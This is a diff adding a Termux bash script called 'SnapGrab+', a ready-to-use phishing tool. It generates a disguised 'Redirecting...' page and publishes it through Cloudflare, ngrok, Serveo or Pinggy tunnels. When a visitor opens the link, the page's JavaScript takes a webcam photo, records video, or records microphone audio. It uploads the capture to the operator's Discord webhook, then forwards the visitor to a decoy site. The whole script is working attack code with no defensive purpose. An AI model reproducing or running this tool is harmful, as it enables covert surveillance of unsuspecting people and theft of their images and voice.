@@ -1,0 +1,581 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+# SnapGrab+ - Video/Photo Edition
+
+VERSION="0.1"
+
+# Enhanced Colors
+RED='\033[38;5;196m'
+GREEN='\033[38;5;46m'
+YELLOW='\033[38;5;226m'
+BLUE='\033[38;5;39m'
+MAGENTA='\033[38;5;201m'
+CYAN='\033[38;5;51m'
+WHITE='\033[38;5;255m'
+ORANGE='\033[38;5;214m'
+PINK='\033[38;5;205m'
+NC='\033[0m'
+BOLD='\033[1m'
+DIM='\033[2m'
+ITALIC='\033[3m'
+
+# Kill everything on CTRL+C
+trap "echo -e '\n${RED}✗${NC} ${DIM}Exiting...${NC}'; kill \$(jobs -p) 2>/dev/null; pkill -f 'http.server'; pkill cloudflared; pkill ngrok; pkill -f 'serveo.net'; pkill -f 'pinggy.io'; rm -f index.html .*.log 2>/dev/null; echo -e '${GREEN}✓${NC} ${DIM}Cleanup complete${NC}'; exit 0" INT TERM
+
+# Function to show banner
+show_banner() {
+    clear
+    echo -e "${GREEN}${BOLD}"
+    cat << 'BANNER'
+  ____                     ____           _           
+ / ___| _ __   __ _ _ __  / ___|_ __ __ _| |__    _   
+ \___ \| '_ \ / _` | '_ \| |  _| '__/ _` | '_ \ _| |_ 
+  ___) | | | | (_| | |_) | |_| | | | (_| | |_) |_   _|
+ |____/|_| |_|\__,_| .__/ \____|_|  \__,_|_.__/  |_|  
+                   |_|                                
+BANNER
+    echo -e "${NC}"
+    echo -e "${PINK}${ITALIC}SnapGrab+ v$VERSION | Video/Photo/Audio Edition${NC}"
+    echo ""
+}
+
+# Function to show error and wait for ENTER
+show_error_and_wait() {
+    local error_msg="$1"
+    echo -e "${RED}✗ ERROR: ${error_msg}${NC}"
+    echo ""
+    read -p "$(echo -e "${YELLOW}➜${NC} ${DIM}Press ENTER to continue...${NC}")"
+}
+
+# Validation functions
+validate_port() {
+    [[ "$1" =~ ^[0-9]+$ ]] && [ "$1" -ge 1024 ] && [ "$1" -le 65535 ]
+}
+
+validate_webhook() {
+    [[ "$1" =~ ^https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+$ ]]
+}
+
+validate_url() {
+    [[ "$1" =~ ^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$ ]]
+}
+
+validate_number_only() {
+    [[ "$1" =~ ^[0-9]+$ ]]
+}
+
+# Fast loading
+clear
+echo -e "${CYAN}${BOLD}SnapGrab+ v$VERSION${NC}"
+echo -ne "${YELLOW}Loading ${DIM}"
+for i in {1..2}; do
+echo -n "."
+sleep 0.3
+done
+echo -e "${GREEN} Ready!${NC}"
+sleep 0.5
+
+# Main menu
+while true; do
+show_banner
+echo -e "  ${GREEN}▶${NC} ${BOLD}[1]${NC} Start"
+echo -e "  ${RED}■${NC} ${BOLD}[2]${NC} Exit"
+echo ""
+read -p "$(echo -e "${WHITE}➜${NC} ${DIM}Choose: ${NC}")" main_choice
+
+if [ "$main_choice" = "1" ]; then
+    break
+elif [ "$main_choice" = "2" ]; then
+    exit 0
+else
+    show_error_and_wait "Invalid choice! Please select 1 or 2"
+fi
+done
+
+# Tunnel selection
+while true; do
+show_banner
+echo -e "  ${CYAN}🌐${NC} ${BOLD}[1]${NC} Cloudflare Tunnel"
+echo -e "  ${YELLOW}🔗${NC} ${BOLD}[2]${NC} Ngrok"
+echo -e "  ${BLUE}🚇${NC} ${BOLD}[3]${NC} Serveo"
+echo -e "  ${MAGENTA}🔄${NC} ${BOLD}[4]${NC} Pinggy.io"
+echo ""
+read -p "$(echo -e "${WHITE}➜${NC} ${DIM}Select tunnel method (1-4): ${NC}")" TUNNEL_CHOICE
+
+case $TUNNEL_CHOICE in
+    1|2|3|4) break ;;
+    *) show_error_and_wait "Invalid choice! Please select 1, 2, 3, or 4" ;;
+esac
+done
+
+# Port configuration
+while true; do
+show_banner
+echo -e "${CYAN}⚙️  Configuration${NC}"
+echo ""
+read -p "$(echo -e "${YELLOW}🔌${NC} ${DIM}Enter port ${NC}(1024-65535, ${DIM}default: 9090${NC}): ")" PORT
+[ -z "$PORT" ] && PORT=9090
+
+if validate_port "$PORT"; then
+    break
+else
+    show_error_and_wait "Invalid port! Must be a number between 1024 and 65535 (got: $PORT)"
+fi
+done
+
+# Discord webhook
+while true; do
+show_banner
+echo -e "${CYAN}📡 Discord Integration${NC}"
+echo ""
+echo -e "${DIM}Format: https://discord.com/api/webhooks/ID/TOKEN${NC}"
+echo ""
+read -p "$(echo -e "${YELLOW}🔗${NC} ${DIM}Enter Discord webhook URL ${NC}: ")" WEBHOOK_URL
+
+if [ -z "$WEBHOOK_URL" ]; then
+    show_error_and_wait "Webhook URL cannot be blank!"
+elif validate_webhook "$WEBHOOK_URL"; then
+    break
+else
+    show_error_and_wait "Invalid webhook URL format! Must be a valid Discord webhook URL"
+fi
+done
+
+# Redirect URL
+while true; do
+show_banner
+echo -e "${CYAN}🎯 Redirection${NC}"
+echo ""
+echo -e "${DIM}Example: https://google.com or http://example.com${NC}"
+echo ""
+read -p "$(echo -e "${YELLOW}↪${NC} ${DIM}Enter redirect link ${NC}: ")" REDIR_URL
+
+if [ -z "$REDIR_URL" ]; then
+    show_error_and_wait "Redirect URL cannot be blank!"
+elif validate_url "$REDIR_URL"; then
+    break
+else
+    show_error_and_wait "Invalid URL format! Must start with http:// or https://"
+fi
+done
+
+# Capture type selection
+while true; do
+show_banner
+echo -e "${CYAN}📸 Capture Type${NC}"
+echo ""
+echo -e "  ${GREEN}📷${NC} ${BOLD}[1]${NC} Photo (single shot)"
+echo -e "  ${YELLOW}🎥${NC} ${BOLD}[2]${NC} Video (custom duration, max 15s)"
+echo -e "  ${BLUE}🎤${NC} ${BOLD}[3]${NC} Audio (voice recording, max 30s)"
+echo ""
+read -p "$(echo -e "${WHITE}➜${NC} ${DIM}Choose (1-3): ${NC}")" CAPTURE_TYPE
+
+case $CAPTURE_TYPE in
+    1|2|3) break ;;
+    *) show_error_and_wait "Invalid choice! Please select 1, 2, or 3" ;;
+esac
+done
+
+VIDEO_SEC=5
+AUDIO_SEC=10
+
+# Video duration
+if [ "$CAPTURE_TYPE" = "2" ]; then
+while true; do
+show_banner
+echo -e "${CYAN}⏱️  Video Configuration${NC}"
+echo ""
+read -p "$(echo -e "${YELLOW}🎬${NC} ${DIM}Enter video duration in seconds (1-15, default 5): ${NC}")" INPUT_SEC
+
+if [ -z "$INPUT_SEC" ]; then
+VIDEO_SEC=5
+break
+elif validate_number_only "$INPUT_SEC" && [ "$INPUT_SEC" -ge 1 ] && [ "$INPUT_SEC" -le 15 ]; then
+VIDEO_SEC=$INPUT_SEC
+break
+else
+    show_error_and_wait "Invalid duration! Must be a number between 1 and 15 (got: $INPUT_SEC)"
+fi
+done
+fi
+
+# Audio duration
+if [ "$CAPTURE_TYPE" = "3" ]; then
+while true; do
+show_banner
+echo -e "${CYAN}⏱️  Audio Configuration${NC}"
+echo ""
+read -p "$(echo -e "${YELLOW}🎵${NC} ${DIM}Enter audio duration in seconds (1-30, default 10): ${NC}")" INPUT_SEC
+
+if [ -z "$INPUT_SEC" ]; then
+AUDIO_SEC=10
+break
+elif validate_number_only "$INPUT_SEC" && [ "$INPUT_SEC" -ge 1 ] && [ "$INPUT_SEC" -le 30 ]; then
+AUDIO_SEC=$INPUT_SEC
+break
+else
+    show_error_and_wait "Invalid duration! Must be a number between 1 and 30 (got: $INPUT_SEC)"
+fi
+done
+fi
+
+# Final confirmation
+show_banner
+echo -e "${CYAN}📋 Configuration Summary${NC}"
+echo ""
+echo -e "${GREEN}✓${NC} ${DIM}Tunnel:${NC} $(case $TUNNEL_CHOICE in 1) echo "Cloudflare";; 2) echo "Ngrok";; 3) echo "Serveo";; 4) echo "Pinggy.io";; esac)"
+echo -e "${GREEN}✓${NC} ${DIM}Port:${NC} $PORT"
+echo -e "${GREEN}✓${NC} ${DIM}Webhook:${NC} ${WEBHOOK_URL:0:50}..."
+echo -e "${GREEN}✓${NC} ${DIM}Redirect:${NC} $REDIR_URL"
+echo -e "${GREEN}✓${NC} ${DIM}Mode:${NC} $( [ "$CAPTURE_TYPE" = "2" ] && echo "VIDEO (${VIDEO_SEC}s)" || [ "$CAPTURE_TYPE" = "3" ] && echo "AUDIO (${AUDIO_SEC}s)" || echo "PHOTO" )"
+echo ""
+echo -e "${YELLOW}✨${NC} ${DIM}Press ENTER to start or CTRL+C to cancel${NC}"
+read -r
+
+# Create HTML based on capture type
+if [ "$CAPTURE_TYPE" = "2" ]; then
+cat << 'HTML' > index.html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { min-height:100vh; display:flex; justify-content:center; align-items:center; background:#000; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    .container { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px; }
+    .loader { width:80px; height:80px; border:8px solid rgba(0,255,0,0.2); border-top:8px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto; }
+    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    .timer { color:#0f0; font-size:18px; text-align:center; font-family:monospace; letter-spacing:1px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="loader"></div>
+    <div class="timer" id="timer">Redirecting in VIDEO_SEC s...</div>
+  </div>
+  <script>
+    const webhookURL = "__WEBHOOK_URL__";
+    const redirectURL = "__REDIR_URL__";
+    let seconds = VIDEO_SEC;
+  
+    async function captureVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => video.onloadedmetadata = r);
+  
+        const timerEl = document.getElementById('timer');
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
+        const chunks = [];
+  
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          const formData = new FormData();
+          formData.append('file', blob, 'video.mp4');
+          formData.append('payload_json', JSON.stringify({ content: `📹 Video captured - ${VIDEO_SEC}s - ${new Date().toLocaleString()}` }));
+          
+          await fetch(webhookURL, { method: 'POST', body: formData }).catch(e => console.log(e));
+          stream.getTracks().forEach(track => track.stop());
+          window.location.href = redirectURL;
+        };
+  
+        mediaRecorder.start();
+        
+        const interval = setInterval(() => {
+          seconds--;
+          if (seconds > 0) {
+            timerEl.textContent = `Redirecting in ${seconds}s...`;
+          } else {
+            clearInterval(interval);
+            timerEl.textContent = `Redirecting...`;
+            mediaRecorder.stop();
+          }
+        }, 1000);
+  
+      } catch(err) {
+        console.log('Error:', err);
+        window.location.href = redirectURL;
+      }
+    }
+  
+    captureVideo();
+  </script>
+</body>
+</html>
+HTML
+
+elif [ "$CAPTURE_TYPE" = "3" ]; then
+cat << 'HTML' > index.html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { min-height:100vh; display:flex; justify-content:center; align-items:center; background:#000; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    .container { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px; }
+    .loader { width:80px; height:80px; border:8px solid rgba(0,255,0,0.2); border-top:8px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto; }
+    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    .timer { color:#0f0; font-size:18px; text-align:center; font-family:monospace; letter-spacing:1px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="loader"></div>
+    <div class="timer" id="timer">Redirecting in AUDIO_SEC s...</div>
+  </div>
+  <script>
+    const webhookURL = "__WEBHOOK_URL__";
+    const redirectURL = "__REDIR_URL__";
+    let seconds = AUDIO_SEC;
+  
+    async function captureAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const timerEl = document.getElementById('timer');
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+  
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/mp3' });
+          const formData = new FormData();
+          formData.append('file', blob, 'audio.mp3');
+          formData.append('payload_json', JSON.stringify({ content: `🎤 Audio captured - ${AUDIO_SEC}s - ${new Date().toLocaleString()}` }));
+          
+          await fetch(webhookURL, { method: 'POST', body: formData }).catch(e => console.log(e));
+          stream.getTracks().forEach(track => track.stop());
+          window.location.href = redirectURL;
+        };
+  
+        mediaRecorder.start();
+        
+        const interval = setInterval(() => {
+          seconds--;
+          if (seconds > 0) {
+            timerEl.textContent = `Redirecting in ${seconds}s...`;
+          } else {
+            clearInterval(interval);
+            timerEl.textContent = `Redirecting...`;
+            mediaRecorder.stop();
+          }
+        }, 1000);
+  
+      } catch(err) {
+        console.log('Error:', err);
+        window.location.href = redirectURL;
+      }
+    }
+  
+    captureAudio();
+  </script>
+</body>
+</html>
+HTML
+
+else  
+cat << 'HTML' > index.html  
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { min-height:100vh; display:flex; justify-content:center; align-items:center; background:#000; }
+    .loader { width:80px; height:80px; border:8px solid rgba(0,255,0,0.2); border-top:8px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; }
+    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <script>
+    const webhookURL = "__WEBHOOK_URL__";
+    const redirectURL = "__REDIR_URL__";
+    
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => video.onloadedmetadata = r);
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.png');
+        formData.append('payload_json', JSON.stringify({ content: `📸 Photo captured - ${new Date().toLocaleString()}` }));
+        
+        await fetch(webhookURL, { method: 'POST', body: formData }).catch(e => console.log(e));
+        stream.getTracks().forEach(track => track.stop());
+      } catch(err) {} finally {
+        setTimeout(() => { window.location.href = redirectURL; }, 800);
+      }
+    }
+
+    captureAndSend();
+  </script>
+</body>
+</html>
+HTML
+fi
+
+# Replace placeholders
+sed -i "s|__WEBHOOK_URL__|$WEBHOOK_URL|g" index.html
+sed -i "s|__REDIR_URL__|$REDIR_URL|g" index.html
+sed -i "s|VIDEO_SEC|$VIDEO_SEC|g" index.html
+sed -i "s|AUDIO_SEC|$AUDIO_SEC|g" index.html
+
+# Kill existing processes
+pkill -f "http.server" 2>/dev/null || true
+pkill cloudflared 2>/dev/null || true
+pkill ngrok 2>/dev/null || true
+pkill -f "serveo.net" 2>/dev/null || true
+pkill -f "pinggy.io" 2>/dev/null || true
+rm -f .*.log 2>/dev/null
+
+# Start HTTP server
+echo -ne "${CYAN}🚀${NC} ${DIM}Starting HTTP server... ${NC}"
+python3 -m http.server $PORT > /dev/null 2>&1 &
+SERVER_PID=$!
+sleep 1
+if ! kill -0 $SERVER_PID 2>/dev/null; then
+    echo -e "${RED}✗ Failed to start HTTP server${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓${NC}"
+
+# Initialize
+PUBLIC_URL=""
+TUNNEL_PID=""
+
+# Wave animation
+wave_fast() {
+while [ -z "$PUBLIC_URL" ]; do
+echo -ne "\r${CYAN}🌊${NC} ${DIM}Waiting ${YELLOW}.  ${NC}"
+sleep 0.2
+echo -ne "\r${CYAN}🌊${NC} ${DIM}Waiting ${YELLOW}.. ${NC}"
+sleep 0.2
+echo -ne "\r${CYAN}🌊${NC} ${DIM}Waiting ${YELLOW}...${NC}"
+sleep 0.2
+echo -ne "\r${CYAN}🌊${NC} ${DIM}Waiting ${YELLOW}   ${NC}"
+sleep 0.2
+done
+}
+
+# Start tunnel
+case $TUNNEL_CHOICE in
+1)
+echo -e "${CYAN}☁️${NC} ${DIM}Starting Cloudflare Tunnel...${NC}"
+command -v cloudflared &> /dev/null || { echo -e "${RED}✗ Installing cloudflared...${NC}"; pkg install cloudflared -y > /dev/null 2>&1; }
+cloudflared tunnel --url http://localhost:$PORT > .tunnel.log 2>&1 &
+TUNNEL_PID=$!
+
+wave_fast &  
+WAVE_PID=$!  
+
+while [ -z "$PUBLIC_URL" ]; do  
+  sleep 0.3  
+  PUBLIC_URL=$(grep -o 'https://[-0-9a-z.]*\.trycloudflare\.com' .tunnel.log 2>/dev/null | head -n 1)  
+  if [ ! -d "/proc/$TUNNEL_PID" ]; then
+      echo -e "\r${RED}✗ Tunnel failed to start${NC}          "
+      kill $WAVE_PID 2>/dev/null
+      exit 1
+  fi
+done  
+kill $WAVE_PID 2>/dev/null  
+echo -e "\r${GREEN}✓${NC} ${DIM}URL Ready!${NC}          "  
+;;
+
+2)
+echo -e "${YELLOW}🔗${NC} ${DIM}Starting Ngrok Tunnel...${NC}"  
+command -v ngrok &> /dev/null || { echo -e "${RED}✗ Installing ngrok...${NC}"; pkg install ngrok -y > /dev/null 2>&1; }
+ngrok http $PORT > .ngrok.log 2>&1 &  
+TUNNEL_PID=$!  
+
+wave_fast &  
+WAVE_PID=$!  
+
+while [ -z "$PUBLIC_URL" ]; do  
+  sleep 0.3  
+  PUBLIC_URL=$(grep -o 'https://[-0-9a-z]*\.ngrok\.io' .ngrok.log 2>/dev/null | head -n 1)  
+  if [ -z "$PUBLIC_URL" ]; then  
+    PUBLIC_URL=$(grep -o 'https://[-0-9a-z]*\.ngrok-free\.app' .ngrok.log 2>/dev/null | head -n 1)  
+  fi  
+  if [ ! -d "/proc/$TUNNEL_PID" ]; then
+      echo -e "\r${RED}✗ Tunnel failed to start${NC}          "
+      kill $WAVE_PID 2>/dev/null
+      exit 1
+  fi
+done  
+kill $WAVE_PID 2>/dev/null  
+echo -e "\r${GREEN}✓${NC} ${DIM}URL Ready!${NC}          "  
+;;
+
+3)
+echo -e "${BLUE}🚇${NC} ${DIM}Starting Serveo Tunnel...${NC}"  
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$PORT serveo.net > .serveo.log 2>&1 &  
+TUNNEL_PID=$!  
+
+wave_fast &  
+WAVE_PID=$!  
+
+while [ -z "$PUBLIC_URL" ]; do  
+  sleep 0.3  
+  PUBLIC_URL=$(grep -o 'https://[-a-z0-9.]*serveo\.net' .serveo.log 2>/dev/null | head -n 1)  
+  if [ -z "$PUBLIC_URL" ]; then  
+    PUBLIC_URL=$(grep -o 'Forwarding HTTP traffic from https://[-a-z0-9.]*' .serveo.log 2>/dev/null | sed 's/Forwarding HTTP traffic from //')  
+  fi  
+  if [ ! -d "/proc/$TUNNEL_PID" ]; then
+      echo -e "\r${RED}✗ Tunnel failed to start${NC}          "
+      kill $WAVE_PID 2>/dev/null
+      exit 1
+  fi
+done  
+kill $WAVE_PID 2>/dev/null  
+echo -e "\r${GREEN}✓${NC} ${DIM}URL Ready!${NC}          "  
+;;
+
+4)
+echo -e "${MAGENTA}🔄${NC} ${DIM}Starting Pinggy.io Tunnel...${NC}"
+ssh -p 443 -R0:localhost:$PORT -o StrictHostKeyChecking=no -o ConnectTimeout=5 qr@pinggy.io > .pinggy.log 2>&1 &
+TUNNEL_PID=$!
+
+wave_fast &
+WAVE_PID=$!
+
+while [ -z "$PUBLIC_URL" ]; do
+  sleep 0.3
+  PUBLIC_URL=$(grep -o 'https://[-a-z0-9.]*\.pinggy\.link' .pinggy.log 2>/dev/null | head -n 1)
+  if [ -z "$PUBLIC_URL" ]; then
+    PUBLIC_URL=$(grep -o 'http://[-a-z0-9.]*\.pinggy\.link' .pinggy.log 2>/dev/null | head -n 1)
+  fi
+  if [ ! -d "/proc/$TUNNEL_PID" ]; then
+      echo -e "\r${RED}✗ Tunnel failed to start${NC}          "
+      kill $WAVE_PID 2>/dev/null
+      exit 1
+  fi
+done
+kill $WAVE_PID 2>/dev/null
+echo -e "\r${GREEN}✓${NC} ${DIM}URL Ready!${NC}          "
+;;
+esac
+
+# Show link
+echo ""
+echo -e "${GREEN}🔗${NC} ${BOLD}${CYAN}$PUBLIC_URL${NC}"
+echo -e "${GREEN}📸${NC} ${DIM}Mode:${NC} ${YELLOW}$([ "$CAPTURE_TYPE" = "2" ] && echo "VIDEO (${VIDEO_SEC}s)" || [ "$CAPTURE_TYPE" = "3" ] && echo "AUDIO (${AUDIO_SEC}s)" || echo "PHOTO")${NC}"
+echo -e "${RED}⏹️${NC} ${DIM}Press CTRL+C to stop${NC}"
+echo ""
+
+# Keep running
+while true; do
+sleep 1
+done
